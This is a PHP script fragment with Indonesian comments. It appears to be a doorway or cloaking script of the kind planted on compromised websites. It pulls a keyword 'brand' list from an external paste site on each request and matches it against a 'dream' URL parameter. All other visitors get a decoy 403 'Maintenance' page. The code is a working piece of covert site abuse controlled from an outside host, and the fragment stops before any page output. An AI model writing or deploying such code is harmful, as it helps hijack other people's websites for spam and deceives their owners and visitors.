set_time_limit(0);
function denied()
{
    header("HTTP/1.0 403 Forbidden");
    echo "Maintenance - AH BIASA AJA DONG KOMUKNYA xD";
}

// ambil list pake curl

$filename = "list.txt";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://paste.idcloudhosting.my.id/paste/sxpuj/raw");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
$externalContent = curl_exec($ch);
curl_close($ch);
# save list
if ($externalContent !== false) {
    file_put_contents($filename, $externalContent);
}
# end
if (isset($_GET['dream'])) {
    $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $target_string = strtolower($_GET['dream']);
    foreach ($lines as $item) {
        if (strtolower($item) === $target_string) {
            $BRAND = strtoupper($target_string);
        }
    }
    if (isset($BRAND)) {
        $BRANDS = $BRAND;
        $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
        $fullUrl = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
        if (isset($fullUrl)) {
            $parsedUrl = parse_url($fullUrl);
            $scheme = isset($parsedUrl['scheme']) ? $parsedUrl['scheme'] : '';
            $host = isset($parsedUrl['host']) ? $parsedUrl['host'] : '';
            $path = isset($parsedUrl['path']) ? $parsedUrl['path'] : '';
            $query = isset($parsedUrl['query']) ? $parsedUrl['query'] : '';
            $baseUrl = $scheme . "://" . $host . $path . '?' . $query;
            $urlPath = $baseUrl;
        } else {
            echo "";
        }
    } else {
        denied();
        exit();
    }
} else {
    denied();
    exit();
}
